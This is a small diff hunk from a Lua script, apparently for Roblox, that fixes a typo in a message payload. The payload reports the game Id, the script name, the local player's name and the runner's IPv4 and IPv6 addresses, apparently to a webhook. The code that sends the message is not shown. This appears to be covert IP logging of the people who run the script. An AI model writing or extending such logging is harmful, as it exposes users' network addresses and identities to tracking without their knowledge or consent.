@@ -15,7 +15,7 @@ local data = {
    ["content"] = "Game Id: " .. game.PlaceId .. " - " .. scriptname,
    ["embeds"] = {
        {
-           ["title"] = game.Players.LocalPlayer.Name,z
+           ["title"] = game.Players.LocalPlayer.Name,
            ["description"] = "with " .. webhookcheck .. " - IPv4 - " .. IPv4 .. " IPv6 - " .. IPv6,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
